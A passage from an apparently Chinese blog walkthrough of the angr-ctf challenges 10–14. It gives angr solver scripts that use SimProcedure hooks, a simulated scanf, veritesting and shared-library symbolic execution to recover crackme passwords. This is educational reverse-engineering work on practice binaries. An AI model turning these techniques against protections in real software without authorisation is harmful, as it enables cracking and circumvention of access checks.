class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    init_state = proj.factory.entry_state()<br><br><span class="hljs-meta">    @proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># rax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>


</blockquote>
<h2 id="10-angr-simprocedures：模拟过程调用"><a href="#10-angr-simprocedures：模拟过程调用" class="headerlink" title="10_angr_simprocedures：模拟过程调用"></a>10_angr_simprocedures：模拟过程调用</h2><p>惯例拖入 IDA ，这一次的伪代码还是一坨史所以直接看汇编，可以看到虽然还是惯例的 <code>complex_function()</code> 对输入进行处理后使用 <code>check_equals()</code> 进行路径爆炸的逐字符比较，但不同的是这一次多了许多的伪路径：</p>
<p><img src="https://s2.loli.net/2022/11/02/rj5ThAGsOeql9FP.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>而每个伪路径后面都对应着一个路径爆炸的 <code>check_equals()</code> ：</p>
<p><img src="https://s2.loli.net/2022/11/02/pLiH6FYE1DJfrc9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>如果我们对于每个伪路径后边的基本块都手动进行 hook，那未免也过于麻烦，因此这一次我们可以利用 angr 直接通过函数符号来 hook 掉 <code>check_equals()</code> 函数</p>
<h3 id="angr-SimProcedure-模拟函数（过程）"><a href="#angr-SimProcedure-模拟函数（过程）" class="headerlink" title="angr.SimProcedure - 模拟函数（过程）"></a>angr.SimProcedure - 模拟函数（过程）</h3><p>在 angr 中 <code>angr.SimProcedure</code> 类用来表示<strong>在一个状态上的一个运行过程</strong>——即函数实际上是一个 SimPrecedure</p>
<p>我们可以通过创建一个继承自 <code>angr.SimProcedure</code> 的类并重写 <code>run()</code> 方法的方式来表示一个自定义函数，其中 <code>run()</code> 方法的参数为该函数所接收的参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, arg1, arg2</span>):<br>        <span class="hljs-comment"># do something, this&#x27;s an example</span><br>        <span class="hljs-keyword">return</span> self.state.memory.load(arg1, arg2)<br></code></pre></td></tr></table></figure>

<p>自定义函数过程主要用于对文件中的原有函数进行替换，例如 angr 缺省会用内置的一些 SimProcedure 来替换掉一些库函数<br>若我们已经有该二进制文件的符号表，我们可以直接使用 <code>project.hook_symbol(symbol_str, sim_procedure_instance)</code> 来自动 hook 掉文件中所有的对应符号，其中 <code>run()</code> 方法的<strong>参数为被替换函数所接收的参数</strong>，这是一个🌰：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>class MyProcedure(angr.SimProcedure):<br>    def run(self, arg1, arg2):<br>        # do something, this&#x27;s an example<br>        return self.state.memory.load(arg1, arg2)<br><br>proj = angr.Project(&#x27;./test&#x27;)<br>proj.hook_symbol(&#x27;func_to_hook&#x27;, MyProcedure())<br></code></pre></td></tr></table></figure>

<p>当然，在 SimProcedure 的 <code>run()</code> 过程中我们也可以使用一些有用的成员函数：</p>
<ul>
<li><code>ret(expr)</code>: 函数返回</li>
<li><code>jump(addr)</code>: 跳转到指定地址</li>
<li><code>exit(code)</code>: 终止程序</li>
<li><code>call(addr, args, continue_at)</code>: 调用文件中的函数</li>
<li><code>inline_call(procedure, *args)</code>: 内联地调用另一个 SimProcedure</li>
</ul>
<h3 id="FINAL-EXPLOIT-6"><a href="#FINAL-EXPLOIT-6" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么这里我们只需要将该符号直接替换成我们的自定义比较函数即可，因此最终的写法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br>import sys<br><br>class MyRelacementHookProcedure(angr.SimProcedure):<br>    def run(self, buffer_addr, buffer_len):<br>        buffer = self.state.memory.load(buffer_addr, buffer_len)<br>        compared_str = b&#x27;XFQUUEQFKBECVEJF&#x27;<br>        return claripy.If(buffer == compared_str, claripy.BVV(1, 32), claripy.BVV(0, 32))<br><br>def find_path(state):<br>    return b&#x27;Good Job.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def avoid_path(state):<br>    return b&#x27;Try again.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def solver():<br>    bin_path = &#x27;./10_angr_simprocedures&#x27;<br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    # hook the check_equals()<br>    proj.hook_symbol(&#x27;check_equals_XFQUUEQFKBECVEJF&#x27;, MyRelacementHookProcedure())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        print(solution_state.posix.dumps(sys.stdin.fileno()))<br>    else:<br>        raise Exception(&#x27;Could not find the solution&#x27;)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>还是秒解：</p>
<p><img src="https://s2.loli.net/2022/11/03/1GntXiVluADdbRs.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="11-angr-sim-scanf：模拟-scanf"><a href="#11-angr-sim-scanf：模拟-scanf" class="headerlink" title="11_angr_sim_scanf：模拟 scanf"></a>11_angr_sim_scanf：模拟 scanf</h2><p>惯例拖进 IDA，提示 graph is too big</p>
<p><img src="https://s2.loli.net/2022/11/03/epOU2j6iDcyZutL.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>看一下反汇编，可以发现这一次是在 <code>scanf()</code> 前面有很多伪分支：</p>
<p><img src="https://s2.loli.net/2022/11/03/LP97x2dUXNjTsKz.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>这些伪分支的导向都是以 <code>scanf()</code> 开头的基本块，可以看到的是其都使用 <code>%u %u</code> 来读入两个四字节无符号数后使用 <code>strncmp()</code> 与 8 字节的字符串进行对比</p>
<p><img src="https://s2.loli.net/2022/11/03/d4GlDOc7TANCZMS.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>在最开始还有 <code>complex_function()</code> 处理待比较的源字符串，还是老样子就不进去看了：</p>
<p><img src="https://s2.loli.net/2022/11/03/v8bZzJgAPOpG7K4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那么这题的结构和 02 其实是基本上一样的，只不过 <code>scanf()</code> 被移到了伪分支基本块中，因此用 02 的解题脚本依然可以秒解，但这样就不是我们做题的目的了：）</p>
<p>本题实际上算是对上一题的扩展，由于我们已知对 <code>scanf()</code> 的调用会读入两个数值，我们可以直接实现一个 SimProcedure 来模拟该过程，而不需要再走 <code>scanf()</code> 内部的复杂路径</p>
<p>这里我们若是在 <code>run()</code> 方法内创建 BVS ，则可以通过将其储存到 <code>state.globals</code> 列表的方式以便后续取用</p>
<p>因此最后的解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmt_str, buffer0_addr, buffer1_addr</span>):<br>        buffer0 = claripy.BVS(<span class="hljs-string">&#x27;buffer0&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        buffer1 = claripy.BVS(<span class="hljs-string">&#x27;buffer1&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        self.state.memory.store(buffer0_addr, buffer0)<br>        self.state.memory.store(buffer1_addr, buffer1)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>] = buffer0<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>] = buffer1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./11_angr_sim_scanf&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MyScanfProcedure())<br>    <br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        buffer0 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>]<br>        buffer1 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>]<br>        password0 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        password1 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password0, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password1, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>还是秒解：</p>
<p><img src="https://s2.loli.net/2022/11/03/pCsdR9Gckawg2Zm.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x05-angr-ctf：路径合并"><a href="#0x05-angr-ctf：路径合并" class="headerlink" title="0x05. angr-ctf：路径合并"></a>0x05. angr-ctf：路径合并</h1><h2 id="12-angr-veritesting：路径合并"><a href="#12-angr-veritesting：路径合并" class="headerlink" title="12_angr_veritesting：路径合并"></a>12_angr_veritesting：路径合并</h2><p>惯例拖入 IDA，不知道为啥 IDA 反编译出来一坨史所以直接看汇编，在读入输入后来到的红框里是一个循环  <code>for (int i = 0; i &lt;= 0x1F; i++)</code> ，每轮循环都会计算 <code>complex_function(&#39;X&#39;, i + &#39;V&#39;)</code> 并将结果与 <code>input[i]</code> 对比，全部相等才能通过</p>
<p><img src="https://s2.loli.net/2022/11/04/WaUX8uEwyiMeJFs.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>当然如果当作常规的逆向题来做的话解题脚本很快就能写好了，但这不是我们做题的目的：）</p>
<p>这题看起来和第一题差不多，由但其逐字符比较增加计数的写法会导致路径爆炸的问题，因此我们需要进行 <strong>路径合并</strong> ，这里我们可以直接在创建 simgr 时指定参数 <code>veritesting=True</code>，这样 angr 便会在运行过程中自动进行路径合并，从而缓解路径爆炸的问题</p>
<blockquote>
<p>具体原理可以参考 <a target="_blank" rel="noopener" href="https://users.ece.cmu.edu/~dbrumley/pdf/Avgerinos%20et%20al._2014_Enhancing%20Symbolic%20Execution%20with%20Veritesting.pdf">这篇论文</a></p>
</blockquote>
<p>因此最后的解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;12_angr_veritesting&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, veritesting = <span class="hljs-literal">True</span>)<br>    simgr.explore(find = <span class="hljs-number">0x8049371</span>, avoid = <span class="hljs-number">0x8049393</span>)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>还是几秒钟就解出来了：</p>
<p><img src="https://s2.loli.net/2022/11/04/FvgfaL9sIjND3bh.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x06-angr-ctf：库操作"><a href="#0x06-angr-ctf：库操作" class="headerlink" title="0x06. angr-ctf：库操作"></a>0x06. angr-ctf：库操作</h1><h2 id="13-angr-static-binary：静态编译函数替换"><a href="#13-angr-static-binary：静态编译函数替换" class="headerlink" title="13_angr_static_binary：静态编译函数替换"></a>13_angr_static_binary：静态编译函数替换</h2><p>惯例拖入 IDA，这次还是惯例的读入输入后使用 complex 函数处理后与待对比字符串进行对比的模式，和第一题基本一样，不同的是这一次的二进制文件是静态编译的</p>
<p><img src="https://s2.loli.net/2022/11/04/4IDZJ85bN2oV6BU.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>笔者一开始也没看明白要干啥，后面拉第一题的脚本过来简单跑了一下发现半天没出结果，看了看出题人留下的 <code>scaffold13.py</code> 中有这样的话：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># This challenge is the exact same as the first challenge, except that it was</span><br><span class="hljs-comment"># compiled as a static binary. Normally, Angr automatically replaces standard</span><br><span class="hljs-comment"># library functions with SimProcedures that work much more quickly.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To solve the challenge, manually hook any standard library c functions that</span><br><span class="hljs-comment"># are used. Then, ensure that you begin the execution at the beginning of the</span><br><span class="hljs-comment"># main function. Do not use entry_state.</span><br></code></pre></td></tr></table></figure>

<p>大概就是说通常 angr 会自动将标准库当中的函数替换成 angr 内建的 SimProcedures 伪函数以获得更快的运行速度，但这一次是静态编译的题目，需要我们手动进行替换；同时由于程序运行起始是 <code>__libc_start_main()</code> ，在运行到 main 之前会走很多不必要的但是被静态编译进来的弯路，因此我们需要手动从 main 开始执行而非直接使用 <code>entry_state()</code> ，不过直接替换掉 <code>__libc_start_main()</code> 也是可以的</p>
<p>获取 angr 内置库函数的方式是 <code>angr.SIM_PROCEDURES[lib_name][function_name]</code> ，和我们之前自定义的 hook 函数一样都是 <code>SimProcedure</code> 类，因此我们可以使用 <code>project.hook(func_addr, sim_procedure_instance)</code> 的方式进行 hook，需要注意的是除了 <code>__libc_start_main</code> 以外的需要被 hook 的函数都有大量引用，因此不要图省事直接使用 <code>hook_symbol()</code></p>
<p>因此最后的解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./13_angr_static_binary&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    <span class="hljs-comment"># hook the functions</span><br>    proj.hook(<span class="hljs-number">0x8051330</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;scanf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x80512E0</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;printf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x805EC90</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;puts&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x806D530</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;strcmp&#x27;</span>]())<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, <br>                     angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;glibc&#x27;</span>][<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>这一次解题大概需要半分钟左右</p>
<p><img src="https://s2.loli.net/2022/11/04/r6W9EHzQy8lGwXe.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>以及笔者遇到以下几个<strong>不解</strong>的点：</p>
<ul>
<li>在出题人留下的 <code>scaffold13.py</code> 中提示我们应当将初始状态设为 main 起始，但笔者这么做无法解出题目（会直接把笔者的阿里云学生机内存撑爆，但这是不应该发生的）</li>
<li>在 <code>explore()</code> 中将 find 与 avoid 设为检测 stdout 中字符串的方式会比直接引用基本块地址要快 5s</li>
<li>使用 <code>veritesting=True</code> 会大幅延长解题时间（看起来不会像在笔者有生之年解出的样子）</li>
<li>使用直接 hook 函数的方式可以解出题，但使用 hook <code>main()</code> 中 call 指令的方式<strong>无法找到解</strong></li>
<li>总的解题时间比笔者预想中要长得多</li>
</ul>
<h2 id="14-angr-shared-library：动态库的符号执行"><a href="#14-angr-shared-library：动态库的符号执行" class="headerlink" title="14_angr_shared_library：动态库的符号执行"></a>14_angr_shared_library：动态库的符号执行</h2><blockquote>
<p>这一题的生成脚本有点问题，直接使用会报 <code>No such file or directory </code>的 gcc error， 这是因为在生成脚本中的 <code>generate()</code> 函数最后一行的 gcc 命令中的 <code>-L</code> 参数未指定目录，在后面加一个 <code>.</code> 指定为当前目录即可</p>
</blockquote>
<p>惯例拖入 IDA，这一次在读取输入后调用了自定义的一个动态链接的 <code>validate()</code> 函数对输入进行验证，其定义在自定义库 <code>lib14_angr_shared_library.so</code> 当中</p>
<p><img src="https://s2.loli.net/2022/11/04/bZiq9ks4Klyf8Gz.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那么这题直接暴力 explore 求解是可以的，但是这不是我们做题的目的：）</p>
<p>这题实际上的目的是让我们对动态链接库进行符号执行求解，我们可以直接将初始状态设为 <code>validate()</code>，将结束设为函数返回，并添加对返回值的约束后进行求解即可</p>
<p>我们现在来逆一下这个动态链接库，其中就只是比较简单的一个 complex 处理的过程而已</p>
<p><img src="https://s2.loli.net/2022/11/04/oQyUL8W6hb2f9zl.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那么我们只需要模拟调用 <code>validate()</code> 的过程即可，我们先用 <code>claripy.BVS()</code> 创建一个表示要求解的字符串的符号向量，将其载入到初始状态内存中的一个地址上，之后将这块内存的地址推到栈上作为 <code>validate()</code> 的参数即可</p>
<p>最后就是直接 <code>explore()</code> 到函数返回后添加 <code>eax == 1</code> 的约束后求解即可，需要注意的是由于这是一个动态链接库，因此我们需要在创建 project 时通过指定加载参数 <code>load_options</code> 来<strong>手动指定加载基地址</strong>，具体写法参照笔者的 exp</p>
<p>因此最终的解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./lib14_angr_shared_library.so&#x27;</span><br>    base_addr = <span class="hljs-number">0x400000</span><br>    proj = angr.Project(bin_path, load_options = &#123;<br>        <span class="hljs-string">&#x27;main_opts&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;custom_base_addr&#x27;</span>: base_addr<br>        &#125;<br>    &#125;)<br>    start_addr = base_addr + <span class="hljs-number">0x129C</span> <span class="hljs-comment"># addr of validate()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-number">8</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 8 bytes</span><br>    password_addr = <span class="hljs-number">0x3000000</span><br>    init_state.memory.store(password_addr, password)<br><br>    <span class="hljs-comment"># emulate the process of calling validate(password, 8)</span><br>    init_state.regs.ebp = init_state.regs.esp<br>    init_state.stack_push(<span class="hljs-number">8</span>)<br>    init_state.stack_push(password_addr)<br>    init_state.stack_push(<span class="hljs-number">0xdeadbeef</span>)<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = base_addr + <span class="hljs-number">0x134B</span>)<br><br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    solution_state.add_constraints(solution_state.regs.eax == <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>还是差不多秒解：</p>
<p><img src="https://s2.loli.net/2022/11/05/vQi5PtLqbOVWrxa.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>当然，笔者这里调用函数的方法比较粗犷，也可以使用 angr 提供的 <code>project.factory.call_state(func_addr, args...)</code> 来创建一个函数调用的初始状态，用例写法如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><br>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span><br>proj = angr.Project(bin_path)<br><br>func_addr = <span class="hljs-number">0xdeadbeef</span><br>init_state = proj.factory.call_state(func_addr, <span class="hljs-number">114514</span>, <span class="hljs-number">1919810</span>) <span class="hljs-comment"># func(114514, 1919810)</span><br></code></pre></td></tr></table></figure>

